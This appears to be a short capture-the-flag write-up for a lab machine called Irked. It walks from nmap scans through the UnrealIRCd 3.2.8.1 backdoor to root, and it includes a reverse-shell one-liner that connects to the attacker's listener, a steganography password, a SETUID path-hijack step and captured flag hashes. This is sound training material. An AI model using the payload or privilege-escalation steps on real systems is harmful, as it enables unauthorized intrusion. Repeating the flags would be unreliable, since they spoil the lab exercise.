# Irked

**IPv4: 10.129.234.149**

## Enumeration/Scanning

- sudo nmap -sV -sC -O -v -Pn 10.129.234.149
    
    PORT    STATE SERVICE VERSION
    22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
    111/tcp open  rpcbind 2-4 (RPC #100000)
    

http://10.129.234.149/

- "IRC is almost working!"

Scan IRC ports

- sudo nmap -sV -sC -O -v -Pn -p194,6667,6660-7000 10.129.234.149
    
    PORT     STATE SERVICE VERSION
    6697/tcp open  irc     UnrealIRCd
    

nc IP 6697

admin
:irked.htb 256 ran213eqdw123 :Administrative info about irked.htb
:irked.htb 257 ran213eqdw123 :Bob Smith
:irked.htb 258 ran213eqdw123 :bob
:irked.htb 258 ran213eqdw123 [:widely@used.name](mailto::widely@used.name)

info
Unreal3.2.8.1

## Exploitation

https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/

AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.4 4444 >/tmp/f

nc listener

shell gained

## Privilege Escalation

/home/djmardoc/Documents/
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss

wget http://10.129.234.149/irked.jpg

steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss

Kab6h+m+bbp2J:HG

f725358749c22cdb0fc1d79a6156c32e

SETUID binary for /usr/bin/viewuser
when run: sh: 1: /tmp/listusers: not found

echo sh > /tmp/listusers

chmod +x /tmp/listusers

run viewuser again

root

6f76fb820afc62907311ec27869b456b

## Post-exploitation

None
